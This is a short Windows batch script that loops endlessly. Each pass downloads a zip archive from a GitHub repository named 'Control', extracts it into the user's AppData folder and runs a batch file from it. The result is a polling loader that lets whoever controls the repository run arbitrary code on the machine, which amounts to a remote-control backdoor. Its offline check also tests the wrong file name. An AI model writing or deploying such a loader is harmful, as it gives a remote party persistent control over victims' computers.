cd C:\users\%username%\AppData
powershell Import-Module BitsTransfer
:begin
powershell Start-BitsTransfer -source "https://github.com/Guest257351/Control/archive/refs/heads/main.zip" -Destination data.zip
>nul find "WebCmdletWebResponseException" WL1.zip && (
  goto offline
) || (
  goto online
)
:online
powershell Expand-Archive data.zip C:\users\%username%\AppData\scripts -force
cd C:\Users\%username%\AppData\scripts\Control-main
timeout 1 /NOBREAK >nul
call REPtxt.bat
timeout 10 /NOBREAK >nul
goto begin
:offline
timeout 10 /NOBREAK >nul
goto begin